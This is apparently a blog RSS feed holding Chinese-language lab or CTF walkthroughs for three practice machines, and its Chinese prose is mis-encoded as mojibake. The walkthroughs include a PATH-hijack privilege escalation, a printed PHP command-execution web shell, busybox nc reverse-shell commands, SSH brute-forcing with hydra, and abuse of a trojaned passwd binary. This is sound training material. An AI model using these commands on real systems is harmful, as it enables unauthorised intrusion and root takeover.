-rw-r--r-- 1 root root     16 Aug  6 08:39 user.txt
```

‰ΩøÁî® `strings` ÂëΩ‰ª§ÂàÜÊûêËØ•Êñá‰ª∂ÔºåÂèëÁé∞ÂÆÉË∞ÉÁî®‰∫Ü `system` ÂáΩÊï∞ÔºåÂπ∂ÊâßË°å‰∫ÜÂåÖÂê´ `timedatectl` ÁöÑÂëΩ‰ª§Ôºå‰ΩÜÊ≤°Êúâ‰ΩøÁî®ÁªùÂØπË∑ØÂæÑ„ÄÇ

```bash
kyoma@Mayuri:~$ strings TimeMachine
...
system
...
timedateH
ctl | grH
ep 'LocaH
l time' H
...
```

ËøôÊòØ‰∏Ä‰∏™ÂÖ∏ÂûãÁöÑ **PATH ÁéØÂ¢ÉÂèòÈáèÂä´ÊåÅ**ÊºèÊ¥û„ÄÇÁî±‰∫é `TimeMachine` ‰ª• `root` ÊùÉÈôêËøêË°åÔºåÊàë‰ª¨ÂèØ‰ª•ÂàõÂª∫‰∏Ä‰∏™ÂêåÂêçÁöÑÊÅ∂ÊÑèËÑöÊú¨ÔºåÂπ∂‰øÆÊîπ `PATH` ÂèòÈáèÊù•Âä´ÊåÅÂëΩ‰ª§ÊâßË°åÊµÅÁ®ãÔºå‰ªéËÄå‰ª• `root` Ë∫´‰ªΩÊâßË°å‰ªªÊÑè‰ª£Á†Å„ÄÇ

**ÊèêÊùÉÊ≠•È™§:**

1. **ÂàõÂª∫ÊÅ∂ÊÑèËÑöÊú¨**: Âú® `/tmp` ÁõÆÂΩï‰∏ãÂàõÂª∫‰∏Ä‰∏™Âêç‰∏∫ `timedatectl` ÁöÑËÑöÊú¨ÔºåÂÜÖÂÆπ‰∏∫Áªô `/bin/bash` Ê∑ªÂä† SUID ÊùÉÈôê„ÄÇ

   ```bash
   kyoma@Mayuri:~$ echo 'chmod +s /bin/bash' &gt; /tmp/timedatectl
   ```

2. **Ëµã‰∫àÊâßË°åÊùÉÈôê**:

   ```bash
   kyoma@Mayuri:~$ chmod +x /tmp/timedatectl
   ```

3. **Âä´ÊåÅ PATH**: Â∞Ü `/tmp` ÁõÆÂΩïÊ∑ªÂä†Âà∞ `PATH` ÁéØÂ¢ÉÂèòÈáèÁöÑÂºÄÂ§¥„ÄÇ

   ```bash
   kyoma@Mayuri:~$ export PATH=/tmp:$PATH
   ```

4. **Ëß¶ÂèëÊºèÊ¥û**: ÊâßË°å SUID Á®ãÂ∫è `TimeMachine`„ÄÇ

   ```bash
   kyoma@Mayuri:~$ ./TimeMachine
   ```

   Á®ãÂ∫èÊâßË°åÂêéÔºåÊàë‰ª¨ÁöÑÊÅ∂ÊÑèËÑöÊú¨ `/tmp/timedatectl` ‰ºöË¢´‰ª• `root` ÊùÉÈôêË∞ÉÁî®ÔºåÊàêÂäü‰∏∫ `/bin/bash` Ê∑ªÂä†‰∫Ü SUID ‰Ωç„ÄÇ

5. **Ëé∑Âèñ Root Shell**: ‰ΩøÁî® `bash -p` ÂëΩ‰ª§ÂêØÂä®‰∏Ä‰∏™‰øùÁïôÊúâÊïàÁî®Êà∑IDÔºàeuidÔºâÁöÑ ShellÔºå‰ªéËÄåËé∑Âæó `root` ÊùÉÈôê„ÄÇ

   ```bash
   kyoma@Mayuri:~$ ls -al /bin/bash
   -rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash
   kyoma@Mayuri:~$ bash -p
   bash-5.0# id
   uid=1001(kyoma) gid=1001(kyoma) euid=0(root) egid=0(root) groups=0(root),1001(kyoma)
   ```

# Âõõ„ÄÅÂ§∫ÂèñÊóóÂ∏ú

ÊàêÂäüËé∑Âèñ `root` ÊùÉÈôêÂêéÔºåËØªÂèñÊúÄÁªàÁöÑÊóóÂ∏úÊñá‰ª∂„ÄÇ

```bash
bash-5.0# cat /home/kyoma/user.txt 
flag{1.055821%}

bash-5.0# cat /root/root.txt
flag{1.123581%}
```

Ê∏óÈÄèÊµãËØïÂÆåÊàê„ÄÇËøô‰∏ÄÂàáÈÉΩÊòØÂëΩËøêÁü≥‰πãÈó®ÁöÑÈÄâÊã©„ÄÇsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Mayuri.html</guid><pubDate>Fri, 08 Aug 2025 13:35:53 +0000</pubDate></item><item><title>ÂÜÖÈÉ®_Fake</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Fake.html</link><description># ‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ

## 1. ‰∏ªÊú∫ÂèëÁé∞‰∏éÁ´ØÂè£Êâ´Êèè

È¶ñÂÖàÔºåÂú®Êú¨Âú∞ÁΩëÁªú‰∏≠‰ΩøÁî® `arp-scan` ÂèëÁé∞ÁõÆÊ†á‰∏ªÊú∫ÁöÑ IP Âú∞ÂùÄÔºåÈöèÂêéÂà©Áî® `nmap` ÂØπÂÖ∂ËøõË°åÂÖ®Á´ØÂè£Êâ´ÊèèÔºå‰ª•ËØÜÂà´ÂºÄÊîæÁöÑÊúçÂä°„ÄÇ

**‰∏ªÊú∫ÂèëÁé∞:**
ÈÄöËøá `arp-scan` Êâ´ÊèèÔºåÁ°ÆÂÆöÁõÆÊ†á‰∏ªÊú∫ IP ‰∏∫ `192.168.205.136`„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ sudo arp-scan -l
...
192.168.205.136 08:00:27:f7:e4:36       PCS Systemtechnik GmbH
...
```

**Á´ØÂè£Êâ´Êèè:**
`nmap` ÁöÑÊâ´ÊèèÁªìÊûúÊòæÁ§∫ÔºåÁõÆÊ†á‰∏ªÊú∫ÂºÄÊîæ‰∫Ü **22 (SSH)** Âíå **80 (HTTP)** Á´ØÂè£„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ nmap -p- 192.168.205.136
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
...
```

## 2. Web ÊúçÂä°‰æ¶ÂØü

ËÆøÈóÆ 80 Á´ØÂè£ÁöÑ Web ÊúçÂä°ÔºåÂèëÁé∞ÊòØ‰∏Ä‰∏™Ê†áÂáÜÁöÑÁΩëÁ´ôÊ®°Êùø„ÄÇÂú®Êü•ÁúãÁΩëÈ°µÊ∫ê‰ª£Á†ÅÊó∂ÔºåÂèëÁé∞‰∏ÄÊù°ÂÖ≥ÈîÆÊ≥®ÈáäÔºåÊèêÁ§∫ÁõëÂê¨ÁâπÂÆöÁ´ØÂè£„ÄÇ

```html
&lt;!-- Pay attention to listen 12345 --&gt;
```

Ëøô‰∏™Á∫øÁ¥¢ÊöóÁ§∫ÁõÆÊ†á‰∏ªÊú∫ÂèØËÉΩ‰ºöÂú® UDP 12345 Á´ØÂè£‰∏äÊ≥ÑÈú≤Êüê‰∫õ‰ø°ÊÅØ„ÄÇ

# ‰∫å„ÄÅÂàùÂßãËÆøÈóÆ

## 1. ÂèëÁé∞Âπ∂ÊçïËé∑ SSH ÁßÅÈí•Ê≥ÑÈú≤

Ê†πÊçÆ Web Ê∫êÁ†Å‰∏≠ÁöÑÊèêÁ§∫Ôºå‰ΩøÁî® `tcpdump` ÁõëÂê¨ÁõÆÊ†á‰∏ªÊú∫‰∏é UDP 12345 Á´ØÂè£Áõ∏ÂÖ≥ÁöÑÊµÅÈáè„ÄÇÂæàÂø´ÔºåÊàë‰ª¨ÊçïËé∑Âà∞ÁõÆÊ†á‰∏ªÊú∫Ê≠£Âú®ÂπøÊí≠‰∏Ä‰∏™ÁªèËøáÂä†ÂØÜÁöÑ SSH ÁßÅÈí•„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ sudo tcpdump -A host 192.168.205.136 and port 12345
...
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDli31tjr
...
```

**Ê≥®ÊÑè**Ôºö‰ΩøÁî® `tcpdump` ÂëΩ‰ª§Ë°åÂ∑•ÂÖ∑ÂèØËÉΩ‰ºöÂõ†Êï∞ÊçÆÂåÖÂàÜÁâáËÄåÂØºËá¥ÁßÅÈí•ÊçïËé∑‰∏çÂÆåÊï¥„ÄÇÂú®Ê≠§Âú∫ÊôØ‰∏ãÔºåÂêØÂä® `Wireshark` ÂõæÂΩ¢ÂåñÁïåÈù¢Âπ∂‰ΩøÁî®'ËøΩË∏™ÊµÅ' -&gt; 'UDPÊµÅ'ÂäüËÉΩÔºåÂèØ‰ª•Á°Æ‰øùÊçïËé∑Âà∞ÂÆåÊï¥ÁöÑÁßÅÈí•„ÄÇ

![image-20250807220801182](http://7r1UMPHK.github.io/image/20250807220801567.webp)

## 2. Á†¥Ëß£ÁßÅÈí•ÂØÜÁ†ÅÂπ∂ÁàÜÁ†¥Áî®Êà∑Âêç

Êàë‰ª¨Â∞ÜÊçïËé∑Âà∞ÁöÑÂÆåÊï¥ÁßÅÈí•‰øùÂ≠ò‰∏∫ `id_rsa` Êñá‰ª∂„ÄÇÂ∞ùËØïÁõ¥Êé•‰ΩøÁî®ËØ•ÁßÅÈí•ÁôªÂΩïÂ§±Ë¥•ÔºåË°®ÊòéÂÆÉË¢´ÂØÜÁ†Å‰øùÊä§„ÄÇ

Âú®Â∞ùËØïËøûÊé• SSH Êó∂ÔºåÊàë‰ª¨Êî∂Âà∞‰∫Ü‰∏Ä‰∏™ÂåÖÂê´ 'jocke?' Ëâ∫ÊúØÂ≠óÁöÑÊ®™ÂπÖÔºåËøôÊòØÁ†¥Ëß£ÂØÜÁ†ÅÁöÑÂÖ≥ÈîÆÊèêÁ§∫„ÄÇ

ÁªèËøáÂ∞ùËØïÔºåÁ°ÆËÆ§ÁßÅÈí•ÁöÑÂØÜÁ†ÅÂ∞±ÊòØ `jocke`„ÄÇ

Êé•‰∏ãÊù•ÊòØÁ°ÆÂÆöÁî®Êà∑Âêç„ÄÇÁî±‰∫éÁßÅÈí•‰∏≠ÈÄöÂ∏∏ÂåÖÂê´ÁöÑÁî®Êà∑Âêç‰ø°ÊÅØÂ∑≤Ë¢´ÁßªÈô§ÔºåÊàë‰ª¨ÁºñÂÜô‰∫Ü‰∏Ä‰∏™ÁÆÄÂçïÁöÑËÑöÊú¨Êù•ÁàÜÁ†¥Áî®Êà∑Âêç„ÄÇÊúÄÁªàÂèëÁé∞Áî®Êà∑Âêç‰∏∫ `jockey`„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/tmp]
‚îî‚îÄ$ c='abcdefghijklmnopqrstuvwxyz'; for (( i=0; i&lt;${#c}; i++ )); do echo 'jocke${c:$i:1}'; done &gt; user

‚îå‚îÄ‚îÄ(kali„âøkali)-[/tmp]
‚îî‚îÄ$ while read -r u;do echo '$u';ssh -i id_rsa '$u@192.168.205.136' -o PasswordAuthentication=no;done &lt; user
...
jockey
...

‚îå‚îÄ‚îÄ(kali„âøkali)-[/tmp]
‚îî‚îÄ$ ssh jockey@192.168.205.136 -i id_rsa
Enter passphrase for key 'id_rsa': [ËæìÂÖ• jocke]
...
[rbash]:$
```

ÊàêÂäüÁôªÂΩïÂêéÔºåÂèëÁé∞Êàë‰ª¨Ë¢´ÈôêÂà∂Âú®‰∏Ä‰∏™ `rbash` (Restricted Bash) ÁéØÂ¢É‰∏≠ÔºåËÆ∏Â§öÂ∏∏Áî®ÂëΩ‰ª§Êó†Ê≥ïÊâßË°å„ÄÇ

# ‰∏â„ÄÅÊùÉÈôêÊèêÂçá

## 1. ‰ªéÂèóÈôê Shell Âà∞ÂèØÁî® Shell

Âú® `rbash` ÁéØÂ¢É‰∏≠ÔºåÈÄöËøá `ls` Âíå `cat` Á≠âÊúâÈôêÁöÑÂëΩ‰ª§ËøõË°åÊé¢Á¥¢ÔºåÂèëÁé∞‰∫Ü‰∏§‰∏™ÂÖ≥ÈîÆÁÇπÔºö

*   **Áî®Êà∑ Flag**: `user.txt` ‰Ωç‰∫éÂÆ∂ÁõÆÂΩï‰∏ãÔºåÂèØ‰ª•Áõ¥Êé•ËØªÂèñ„ÄÇ
*   **Web ÂêéÈó®**: Âú® `/var/www/html/jockey_hack/` ÁõÆÂΩï‰∏ãÂ≠òÂú®‰∏Ä‰∏™Âêç‰∏∫ `test.php` ÁöÑÊñá‰ª∂ÔºåËøôÊòØ‰∏Ä‰∏™ÁÆÄÂçïÁöÑÂëΩ‰ª§ÊâßË°åÂêéÈó®„ÄÇ

```php
&lt;?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?&gt;
```

Âà©Áî®Ëøô‰∏™ÂêéÈó®ÔºåÊàë‰ª¨ÂèØ‰ª•Âú®Êú¨Âú∞ÁõëÂê¨Á´ØÂè£ÔºåÂπ∂ÈÄöËøá `curl` ËÆøÈóÆËØ• PHP Êñá‰ª∂Êù•Ëé∑Âèñ‰∏Ä‰∏™ÂèçÂêë Shell„ÄÇ

**Êú¨Âú∞ÁõëÂê¨:**

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ nc -lvnp 8888
```

**Ëß¶ÂèëÂèçÂºπ Shell:**

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ curl 'http://192.168.205.136/jockey_hack/test.php?cmd=busybox+nc+192.168.205.128+8888+-e+/bin/bash'
```

Ëé∑ÂèñÂà∞ÁöÑÊñ∞ Shell ËôΩÁÑ∂ÊòØ `bash`Ôºå‰ΩÜÂÖ∂ÁéØÂ¢ÉÂèòÈáè `PATH` Ë¢´‰øÆÊîπÔºåÂØºËá¥ÂëΩ‰ª§Êó†Ê≥ïÊ≠£Â∏∏‰ΩøÁî®„ÄÇÈÄöËøá `jockey` Áî®Êà∑ÂÆ∂ÁõÆÂΩï‰∏ãÁöÑ `.bashrc` Êñá‰ª∂ÂèØ‰ª•Á°ÆËÆ§Ëøô‰∏ÄÁÇπ„ÄÇÊàë‰ª¨È¶ñÂÖàÈúÄË¶ÅÊâãÂä®ËÆæÁΩÆ‰∏Ä‰∏™Ê≠£Â∏∏ÁöÑ `PATH` ÁéØÂ¢ÉÂèòÈáèÊù•ÊÅ¢Â§ç Shell ÁöÑÂäüËÉΩ„ÄÇ

```bash
jockey@Fake:~$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

## 2. ‰ªé `jockey` Áî®Êà∑Âà∞ `backup` Áî®Êà∑

Âú® `jockey` ÁöÑÂÆ∂ÁõÆÂΩï‰∏≠Ôºå‰∏Ä‰∏™Âêç‰∏∫ `note.txt` ÁöÑÊñá‰ª∂ÂÜôÁùÄ 'I like to backup.'ÔºåËøôÂº∫ÁÉàÊöóÁ§∫ `backup` Áî®Êà∑ÊòØ‰∏ã‰∏Ä‰∏™ÁõÆÊ†á„ÄÇÈÄöËøá `cat /etc/passwd` Êàë‰ª¨ÂèëÁé∞ `backup` Áî®Êà∑Â≠òÂú®Ôºå‰ΩÜÂÖ∂ÁôªÂΩï Shell Ë¢´ËÆæÁΩÆ‰∏∫ `/usr/sbin/nologin`„ÄÇ

ÁÑ∂ËÄåÔºåÁªèËøáÊ£ÄÊü•ÂèëÁé∞ `/usr/sbin/nologin` Êñá‰ª∂ÂÆûÈôÖ‰∏äÊòØ‰∏Ä‰∏™Ë¢´ÊõøÊç¢ÁöÑ `/bin/bash` ÂâØÊú¨ÔºåËøôÊòØ‰∏Ä‰∏™ÈöêËóèÁöÑÂêéÈó®„ÄÇ

```bash
jockey@Fake:~$ dpkg -V
...
??5??????   /usr/bin/passwd
...
??5??????   /usr/sbin/nologin

jockey@Fake:/tmp$ ls -al /usr/sbin/nologin
-rwxr-xr-x 1 root root 1168776 May 18 23:38 /usr/sbin/nologin

jockey@Fake:/tmp$ diff /usr/sbin/nologin /bin/bash

```

Êé•‰∏ãÊù•Ôºå‰ΩøÁî® `hydra` ÂØπ `backup` Áî®Êà∑ÁöÑ SSH ÂØÜÁ†ÅËøõË°åÁàÜÁ†¥ÔºåÊàêÂäüËé∑ÂæóÂØÜÁ†Å `12345`„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ hydra -l backup -P /path/to/password-list.txt ssh://192.168.205.136
...
[22][ssh] host: 192.168.205.136   login: backup   password: 12345
```

‰ΩøÁî®Êñ∞Âá≠ÊçÆÁôªÂΩï `backup` Áî®Êà∑„ÄÇ

## 3. ‰ªé `backup` Áî®Êà∑Âà∞ `root`

ÁôªÂΩï `backup` Áî®Êà∑ÂêéÔºåÂú®ÂÖ∂ÂÆ∂ÁõÆÂΩï `/var/backups` ‰∏ãÔºåÂèëÁé∞‰∫Ü‰∏Ä‰∏™Âêç‰∏∫ `passwd_bak` ÁöÑÊñá‰ª∂„ÄÇÈÄöËøá‰∏éÁ≥ªÁªüÂΩìÂâçÁöÑ `/usr/bin/passwd` Êñá‰ª∂ËøõË°åÂØπÊØîÔºåÂèëÁé∞ÂêéËÄÖÂ∑≤Ë¢´‰øÆÊîπ„ÄÇ

```bash
backup@Fake:~$ which passwd
/usr/bin/passwd
backup@Fake:~$ diff passwd_bak /usr/bin/passwd
Binary files passwd_bak and /usr/bin/passwd differ
```

‰ΩøÁî® `strings` ÂëΩ‰ª§ÂàÜÊûêË¢´‰øÆÊîπÁöÑ `/usr/bin/passwd` Êñá‰ª∂ÔºåÂèëÁé∞ÂÆÉ‰ºöÂä†ËΩΩ‰∏Ä‰∏™ÊÅ∂ÊÑèÁöÑÂÖ±‰∫´Â∫ìÔºö`/etc/.libc/evil.so`„ÄÇ

ÁªßÁª≠ÂàÜÊûê `/etc/.libc/evil.so`ÔºåÂèëÁé∞ÂÆÉ‰ºöÂú®Ë¢´Âä†ËΩΩÊó∂ÊâßË°å‰∏Ä‰∏™ËÑöÊú¨ `/var/backups/evil.sh`„ÄÇ

Áî±‰∫é `backup` Áî®Êà∑ÂØπ `/var/backups` ÁõÆÂΩïÊúâÂÜôÂÖ•ÊùÉÈôêÔºåÊàë‰ª¨ÂèØ‰ª•Âà©Áî®Ëøô‰∏™Êú∫Âà∂ËøõË°åÊèêÊùÉ„ÄÇ

1. **ÂàõÂª∫ Payload**: ÂàõÂª∫ `/var/backups/evil.sh` ËÑöÊú¨ÔºåÂÜÖÂÆπ‰∏∫Áªô `/bin/bash` Ê∑ªÂä† SUID ÊùÉÈôêÔºåÂπ∂Ëµã‰∫àÂÖ∂ÂèØÊâßË°åÊùÉÈôê„ÄÇ

   ```bash
   backup@Fake:~$ echo 'chmod +s /bin/bash' &gt; /var/backups/evil.sh
   backup@Fake:~$ chmod +x /var/backups/evil.sh
   ```

2. **Ëß¶ÂèëÊú®È©¨**: ÊâßË°åË¢´‰øÆÊîπËøáÁöÑ `passwd` ÂëΩ‰ª§„ÄÇËØ•ÂëΩ‰ª§Êã•Êúâ SUID root ÊùÉÈôêÔºåÂõ†Ê≠§ÂÆÉÂä†ËΩΩÁöÑ `evil.so` Â∫ì‰ª•ÂèäÊâßË°åÁöÑ `evil.sh` ËÑöÊú¨ÈÉΩÂ∞Ü‰ª• root Ë∫´‰ªΩËøêË°å„ÄÇ

   ```bash
   backup@Fake:~$ passwd
   ```

3. **Ëé∑Âèñ Root Shell**: `passwd` ÂëΩ‰ª§ÊâßË°åÂêéÔºå`/bin/bash` Â∞±Ë¢´ËÆæÁΩÆ‰∫Ü SUID ‰Ωç„ÄÇÊ≠§Êó∂ÔºåÊàë‰ª¨Âè™ÈúÄÊâßË°å `bash -p` Âç≥ÂèØËé∑Âæó‰∏Ä‰∏™ root ÊùÉÈôêÁöÑ Shell„ÄÇ

   ```bash
   backup@Fake:~$ ls -al /bin/bash
   -rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash
   backup@Fake:~$ bash -p
   bash-5.0# id
   uid=34(backup) gid=34(backup) euid=0(root) egid=0(root) groups=0(root),34(backup)
   ```

# Âõõ„ÄÅÂ§∫ÂèñÊóóÂ∏ú

ÊàêÂäüËé∑Âèñ `root` ÊùÉÈôêÂêéÔºåËØªÂèñÊúÄÁªàÁöÑÊóóÂ∏úÊñá‰ª∂„ÄÇ

```bash
bash-5.0# cat /home/jockey/user.txt
flag{user-7fc904f5c88c07c18b558dc203729555}

bash-5.0# cat /root/root.txt
flag{root-3a7d567ac33be7bb8a77a7ce96d35913}
```

Ê∏óÈÄèÊµãËØïÂÆåÊàê„ÄÇsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Fake.html</guid><pubDate>Fri, 08 Aug 2025 00:29:51 +0000</pubDate></item><item><title>ÂÜÖÈÉ®_Xuanji</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Xuanji.html</link><description>![image-20250807122524603](http://7r1UMPHK.github.io/image/20250807122557994.webp)

# **‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ**

## 1. ‰∏ªÊú∫ÂèëÁé∞‰∏éÁ´ØÂè£Êâ´Êèè

È¶ñÂÖàÂú®Êú¨Âú∞ÁΩëÁªú‰∏≠‰ΩøÁî® `arp-scan` Á°ÆÂÆöÁõÆÊ†á‰∏ªÊú∫ÁöÑIPÂú∞ÂùÄÔºåÈöèÂêéÂà©Áî® `nmap` ÂØπÂÖ∂ËøõË°åÂÖ®Á´ØÂè£Êâ´ÊèèÔºå‰ª•ËØÜÂà´ÂºÄÊîæÁöÑÊúçÂä°„ÄÇ

**‰∏ªÊú∫ÂèëÁé∞:**

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ sudo arp-scan -l
...
192.168.205.135 08:00:27:03:7d:ae       PCS Systemtechnik GmbH
...
```

**Á´ØÂè£Êâ´Êèè:**

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ nmap -p- 192.168.205.135
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
...
```

Êâ´ÊèèÁªìÊûúË°®ÊòéÔºåÁõÆÊ†á‰∏ªÊú∫IP‰∏∫ `192.168.205.135`ÔºåÂºÄÊîæ‰∫Ü **22 (SSH)** Âíå **80 (HTTP)** Á´ØÂè£„ÄÇ

## 2. WebÊúçÂä°‰æ¶ÂØü

ËÆøÈóÆ80Á´ØÂè£ÁöÑWebÊúçÂä°ÔºåÂèëÁé∞ÊòØ‰∏Ä‰∏™Ë¶ÅÊ±ÇËæìÂÖ•Google OTPÔºàÂä®ÊÄÅÂè£‰ª§ÔºâÁöÑÁôªÂΩïÈ°µÈù¢„ÄÇËøôË°®ÊòéË∫´‰ªΩÈ™åËØÅÊòØËøõÂÖ•Á≥ªÁªüÁöÑÈ¶ñË¶ÅÈöúÁ¢ç„ÄÇ

# **‰∫å„ÄÅÊºèÊ¥ûÂèëÁé∞‰∏éÂà©Áî®**

## 1. ÂèëÁé∞`.git`Ê∫êÁ†ÅÊ≥ÑÈú≤

ÈíàÂØπWebÁõÆÂΩïËøõË°åÊ∑±Â∫¶Êâ´ÊèèÔºåÂèëÁé∞Â≠òÂú®‰∏Ä‰∏™ÂÖ¨ÂºÄÁöÑ `.git` ÁõÆÂΩï„ÄÇËøôÊòØ‰∏Ä‰∏™‰∏•ÈáçÁöÑ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥ûÔºåÊÑèÂë≥ÁùÄÊï¥‰∏™WebÂ∫îÁî®ÁöÑÊ∫ê‰ª£Á†ÅÂíåÁâàÊú¨ÊéßÂà∂ÂéÜÂè≤ÈÉΩÂèØËÉΩË¢´Ëé∑Âèñ„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ dirsearch -u http://192.168.205.135 
...
[00:31:43] 301 -  317B  - /.git  -&gt;  http://192.168.205.135/.git/
...
```

## 2. ËøòÂéüGit‰ªìÂ∫ìÂπ∂ÂÆ°ËÆ°ÂéÜÂè≤ËÆ∞ÂΩï

‰ΩøÁî® `git-dumper` Â∑•ÂÖ∑Â∞ÜÊ≥ÑÈú≤ÁöÑ `.git` ‰ªìÂ∫ìÂÆåÊï¥Âú∞‰∏ãËΩΩÂà∞Êú¨Âú∞„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/tmp]
‚îî‚îÄ$ git-dumper http://192.168.205.135 .
...
[-] Running git checkout .
‰ªéÁ¥¢ÂºïÂå∫Êõ¥Êñ∞‰∫Ü 1 ‰∏™Ë∑ØÂæÑ
```

ËøõÂÖ•ËøòÂéüÂêéÁöÑ‰ªìÂ∫ìÁõÆÂΩïÔºå‰ΩøÁî® `git log -p` ÂëΩ‰ª§ÂÆ°Êü•Êèê‰∫§ÂéÜÂè≤„ÄÇÂú®ÂéÜÂè≤ËÆ∞ÂΩï‰∏≠ÂèëÁé∞‰∫Ü‰∏Ä‰∏™ÂÖ≥ÈîÆÁ∫øÁ¥¢ÔºöÂºÄÂèë‰∫∫ÂëòÊõæÂ∞Ü‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤‰Ωú‰∏∫Ê≥®ÈáäÊ∑ªÂä†Âà∞‰∫Ü `index.php` Êñá‰ª∂‰∏≠ÔºåÈöèÂêéÂèàÂú®‰∏ã‰∏ÄÊ¨°Êèê‰∫§‰∏≠Â∞ÜÂÖ∂Âà†Èô§„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/tmp]
‚îî‚îÄ$ git log -p
...
commit 189e0034eedd9d026e9d691c9782c72ee51940a1
Author: Your Name &lt;you@example.com&gt;
...
-&lt;!-- 3XKWRL4MDQ5YYPZSYBPDGFLHFA  --&gt;

commit 3dc42d3b5f90552544550d2e09b661fcb114bfe4
Author: Your Name &lt;you@example.com&gt;
...
+&lt;!-- 3XKWRL4MDQ5YYPZSYBPDGFLHFA  --&gt;
...
```

Ëøô‰∏™Ë¢´Ê∑ªÂä†ÂêéÂèàÂà†Èô§ÁöÑÂ≠óÁ¨¶‰∏≤ `3XKWRL4MDQ5YYPZSYBPDGFLHFA` Á¨¶ÂêàBase32ÁºñÁ†ÅÊ†ºÂºèÔºåÊûÅÊúâÂèØËÉΩÊòØÁî®‰∫éÁîüÊàêGoogle AuthenticatorÂä®ÊÄÅÂè£‰ª§ÁöÑ**ÂÖ±‰∫´ÂØÜÈí• (TOTP Secret Key)**„ÄÇ

### 3. ÂàùÂßãËÆøÈóÆÔºöÂà©Áî®TOTPÂØÜÈí•ÁôªÂΩï

Âà©Áî®Âú®Á∫øTOTPÁîüÊàêÂ∑•ÂÖ∑ÔºàÂ¶Ç`https://totp.skae.top/`ÔºâÔºåÂ∞ÜËé∑ÂèñÂà∞ÁöÑÂØÜÈí•ËæìÂÖ•ÔºåÂç≥ÂèØÂÆûÊó∂ÁîüÊàêÊúâÊïàÁöÑ6‰ΩçÂä®ÊÄÅÂè£‰ª§„ÄÇ

‰ΩøÁî®ÁîüÊàêÁöÑÂä®ÊÄÅÂè£‰ª§ÊàêÂäüÁôªÂΩïÁ≥ªÁªüÔºåËøõÂÖ•‰∏Ä‰∏™ÂêéÂè∞ÁöÑWeb ShellÔºàÂëΩ‰ª§ÊâßË°åÁ™óÂè£Ôºâ„ÄÇ

### 4. Ëé∑ÂèñÁ®≥ÂÆöShell

Web Shell ‰ΩøÁî®Ëµ∑Êù•ÊûÅ‰∏∫‰∏ç‰æøÔºåÂõ†Ê≠§ÈÄöËøáÊâßË°åÂèçÂêëshellÂëΩ‰ª§ÔºåÂú®Êú¨Âú∞KaliÊîªÂáªÊú∫‰∏äËé∑Âèñ‰∏Ä‰∏™Á®≥ÂÆöÁöÑ„ÄÅ‰∫§‰∫íÂºèÁöÑ `www-data` Áî®Êà∑ÊùÉÈôêShell„ÄÇ

**Êú¨Âú∞ÁõëÂê¨:**

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ nc -lvnp 8888
```

**Web Shell‰∏≠ÊâßË°å:**

```sh
busybox nc 192.168.205.128 -e /bin/bash
```

ÊàêÂäüÊé•Êî∂Âà∞ÂèçÂºπshellÂêéÔºåÈÄöËøá `script` Âíå `stty` Á≠âÂëΩ‰ª§Â∞ÜÂÖ∂ÂçáÁ∫ß‰∏∫ÂäüËÉΩÂÆåÊï¥ÁöÑTTYÁªàÁ´Ø„ÄÇ

# **‰∏â„ÄÅÊùÉÈôêÊèêÂçá**

## 1. ÂèëÁé∞ÊèêÊùÉÂêëÈáè

Âú®Ëé∑Âèñ `www-data` shellÂêéÔºå‰∏ä‰º†Âπ∂ËøêË°åËá™Âä®ÂåñLinuxÊèêÊùÉÊ£ÄÊü•ËÑöÊú¨ `linpeas.sh`„ÄÇÂàÜÊûêÂÖ∂ËæìÂá∫Êä•ÂëäÔºåÂèëÁé∞‰∏Ä‰∏™Ëá¥ÂëΩÁöÑÈÖçÁΩÆÈîôËØØ„ÄÇ

```
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ Checking misconfigurations of ld.so
‚ïö https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#ldso
...
You have write privileges over /etc/ld.so.preload
```

